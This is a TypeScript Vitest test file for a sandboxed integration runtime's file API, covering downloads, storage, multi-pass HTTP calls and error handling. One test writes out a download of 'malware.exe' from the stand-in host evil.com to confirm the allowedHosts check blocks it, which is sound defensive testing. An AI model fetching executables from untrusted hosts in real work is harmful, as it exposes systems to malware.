import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

import type { StorageProvider } from '../types';

import { executeIntegrationImpl } from '../execute_integration_impl';

function createMockStorageProvider(): StorageProvider {
  let fileCounter = 0;

  return {
    async download({ url, fileName, allowedHosts }) {
      if (allowedHosts && allowedHosts.length > 0) {
        const hostname = new URL(url).hostname;
        const isAllowed = allowedHosts.some(
          (h) => hostname === h || hostname.endsWith('.' + h),
        );
        if (!isAllowed) {
          throw new Error(
            `HTTP request to "${hostname}" blocked: host not in allowedHosts [${allowedHosts.join(', ')}]`,
          );
        }
      }

      fileCounter++;
      return {
        fileId: `stor_${fileCounter}`,
        url: `https://storage.example.com/files/${fileCounter}`,
        fileName,
        contentType: 'application/pdf',
        size: 204800,
      };
    },

    async store({ fileName, contentType }) {
      fileCounter++;
      return {
        fileId: `stor_${fileCounter}`,
        url: `https://storage.example.com/files/${fileCounter}`,
        fileName,
        contentType,
        size: 1024,
      };
    },
  };
}

describe('ctx.files API in sandbox', () => {
  const originalFetch = globalThis.fetch;

  beforeEach(() => {
    globalThis.fetch = Object.assign(
      vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ ok: true }), {
          status: 200,
          statusText: 'OK',
          headers: { 'content-type': 'application/json' },
        }),
      ),
      { preconnect: vi.fn() },
    );
  });

  afterEach(() => {
    globalThis.fetch = originalFetch;
  });

  it('should download a file and return a FileReference', async () => {
    const code = `
      var connector = {
        operations: ['get_attachment'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var file = ctx.files.download('https://api.example.com/files/report.pdf', {
            headers: { 'Authorization': 'Bearer tok' },
            fileName: 'report.pdf'
          });
          return { fileId: file.fileId, url: file.url, fileName: file.fileName };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'get_attachment',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
      storageProvider: createMockStorageProvider(),
    });

    expect(result.success).toBe(true);
    expect(result.result).toEqual({
      fileId: 'stor_1',
      url: 'https://storage.example.com/files/1',
      fileName: 'report.pdf',
    });
    expect(result.fileReferences).toHaveLength(1);
    expect(result.fileReferences?.[0]).toMatchObject({
      fileId: 'stor_1',
      fileName: 'report.pdf',
      contentType: 'application/pdf',
      size: 204800,
    });
  });

  it('should store base64 data and return a FileReference', async () => {
    const code = `
      var connector = {
        operations: ['store_attachment'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var file = ctx.files.store('SGVsbG8gV29ybGQ=', {
            encoding: 'base64',
            contentType: 'text/plain',
            fileName: 'hello.txt'
          });
          return { fileId: file.fileId, fileName: file.fileName };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'store_attachment',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
      storageProvider: createMockStorageProvider(),
    });

    expect(result.success).toBe(true);
    expect(result.result).toEqual({
      fileId: 'stor_1',
      fileName: 'hello.txt',
    });
    expect(result.fileReferences).toHaveLength(1);
    expect(result.fileReferences?.[0]).toMatchObject({
      fileId: 'stor_1',
      fileName: 'hello.txt',
      contentType: 'text/plain',
    });
  });

  it('should handle multiple file operations in one execution', async () => {
    const code = `
      var connector = {
        operations: ['get_attachments'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var file1 = ctx.files.download('https://api.example.com/files/a.pdf', {
            fileName: 'a.pdf'
          });
          var file2 = ctx.files.download('https://api.example.com/files/b.pdf', {
            fileName: 'b.pdf'
          });
          return { files: [file1.fileName, file2.fileName] };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'get_attachments',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
      storageProvider: createMockStorageProvider(),
    });

    expect(result.success).toBe(true);
    expect(result.result).toEqual({ files: ['a.pdf', 'b.pdf'] });
    expect(result.fileReferences).toHaveLength(2);
  });

  it('should enforce allowedHosts on file downloads', async () => {
    const code = `
      var connector = {
        operations: ['get_attachment'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var file = ctx.files.download('https://evil.com/malware.exe', {
            fileName: 'malware.exe'
          });
          return { fileId: file.fileId };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'get_attachment',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
      storageProvider: createMockStorageProvider(),
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain('blocked');
  });

  it('should combine HTTP and file operations with multi-pass', async () => {
    globalThis.fetch = Object.assign(
      vi.fn().mockResolvedValue(
        new Response(
          JSON.stringify({
            attachments: [
              { name: 'doc.pdf', downloadUrl: 'https://api.example.com/dl/1' },
            ],
          }),
          {
            status: 200,
            statusText: 'OK',
            headers: { 'content-type': 'application/json' },
          },
        ),
      ),
      { preconnect: vi.fn() },
    );

    const code = `
      var connector = {
        operations: ['sync_with_files'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var resp = ctx.http.get('https://api.example.com/messages/1', {
            headers: { 'Authorization': 'Bearer tok' }
          });
          if (resp.status === 0) return { pending: true };

          var data = resp.json();
          var files = [];
          for (var i = 0; i < data.attachments.length; i++) {
            var att = data.attachments[i];
            var file = ctx.files.download(att.downloadUrl, {
              headers: { 'Authorization': 'Bearer tok' },
              fileName: att.name
            });
            files.push({ fileId: file.fileId, name: file.fileName });
          }
          return { messageId: '1', files: files };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'sync_with_files',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
      storageProvider: createMockStorageProvider(),
    });

    expect(result.success).toBe(true);
    expect(result.result).toMatchObject({
      messageId: '1',
      files: [{ fileId: 'stor_1', name: 'doc.pdf' }],
    });
    expect(result.fileReferences).toHaveLength(1);
  });

  it('should not expose ctx.files when storageProvider is not provided', async () => {
    const code = `
      var connector = {
        operations: ['check_files'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          return { hasFiles: typeof ctx.files !== 'undefined' };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'check_files',
      params: {},
      variables: {},
      secrets: {},
      timeoutMs: 5000,
    });

    expect(result.success).toBe(true);
    expect(result.result).toEqual({ hasFiles: false });
    expect(result.fileReferences).toBeUndefined();
  });

  it('should include files in testConnection result', async () => {
    const code = `
      var connector = {
        operations: ['sync'],
        testConnection: function(ctx) {
          var file = ctx.files.download('https://api.example.com/test-file.txt', {
            fileName: 'test.txt'
          });
          return { status: 'ok', testFileId: file.fileId };
        },
        execute: function(ctx) { return {}; }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: '__test_connection__',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
      storageProvider: createMockStorageProvider(),
    });

    expect(result.success).toBe(true);
    expect(result.result).toMatchObject({ status: 'ok', testFileId: 'stor_1' });
    expect(result.fileReferences).toHaveLength(1);
  });

  it('should handle file operation errors gracefully', async () => {
    const failingProvider: StorageProvider = {
      async download() {
        throw new Error('Storage service unavailable');
      },
      async store() {
        throw new Error('Storage service unavailable');
      },
    };

    const code = `
      var connector = {
        operations: ['get_file'],
        testConnection: function(ctx) { return { status: 'ok' }; },
        execute: function(ctx) {
          var file = ctx.files.download('https://api.example.com/file.pdf', {
            fileName: 'file.pdf'
          });
          return { fileId: file.fileId };
        }
      };
    `;

    const result = await executeIntegrationImpl({
      code,
      operation: 'get_file',
      params: {},
      variables: {},
      secrets: {},
      allowedHosts: ['example.com'],
      timeoutMs: 5000,
      storageProvider: failingProvider,
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain('Storage service unavailable');
  });
});
